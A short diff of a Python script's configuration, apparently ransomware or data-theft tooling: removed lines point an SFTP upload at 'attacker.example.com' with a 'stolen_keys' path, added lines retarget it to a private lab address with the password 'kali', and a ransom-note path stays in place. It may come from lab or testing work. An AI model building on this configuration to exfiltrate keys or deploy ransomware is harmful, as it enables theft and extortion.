@@ -13,11 +13,11 @@ import time
 import subprocess
 
 # Configuration
-SFTP_SERVER = "attacker.example.com"
+SFTP_SERVER = "192.168.64.6"
 SFTP_PORT = 22
-SFTP_USER = "malicious_user"
-SFTP_PASS = "bad_password"
-SFTP_KEY_PATH = "/home/malicious_user/stolen_keys/"
+SFTP_USER = "sftpuser"
+SFTP_PASS = "kali"
+SFTP_KEY_PATH = "/home/"
 RANSOM_NOTE = "/root/README.txt"
 
 # Setup logging
